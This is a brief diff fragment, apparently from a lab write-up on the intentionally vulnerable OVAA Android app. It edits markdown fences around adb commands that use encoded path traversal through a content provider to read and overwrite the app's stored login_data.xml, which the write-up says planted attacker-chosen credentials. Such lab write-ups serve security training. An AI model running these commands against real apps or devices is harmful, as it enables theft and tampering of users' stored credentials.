@@ -52,9 +52,8 @@ adb shell content read --uri "content://oversecured.ovaa.theftoverwrite/..%2F..%
     <string name="email">...</string>
 </map>
 ```
-```bash
 adb shell content write --uri "content://oversecured.ovaa.theftoverwrite/..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml" < payload.xml
-
+```
 ```
 confirming attacker-supplied `login_url`, `email`, and `password` values were written in place.
 
